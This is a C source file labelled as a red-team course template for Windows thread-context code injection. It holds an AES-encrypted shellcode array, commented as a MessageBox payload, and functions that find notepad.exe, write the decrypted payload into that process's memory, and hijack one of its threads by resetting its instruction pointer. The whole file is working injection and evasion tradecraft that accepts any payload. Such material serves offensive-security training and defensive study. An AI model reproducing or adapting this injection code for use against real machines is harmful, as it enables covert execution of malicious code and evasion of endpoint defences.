/*

 Red Team Operator course code template
 Thread context code injection
 
 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// MessageBox shellcode - 64-bit
unsigned char payload[] = { 0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
unsigned char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };

unsigned int payload_len = sizeof(payload);

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}



// set remote process/thread context
int InjectCTX(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	// find a thread in target process
	hThread = FindThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}

	// Decrypt payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	// perform payload injection
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	// execute the payload by hijacking a thread in target process
	SuspendThread(hThread);	
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR) pRemoteCode;
#else
	ctx.Rip = (DWORD_PTR) pRemoteCode;
#endif
	SetThreadContext(hThread, &ctx);
	
	return ResumeThread(hThread);	
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			InjectCTX(pid, hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
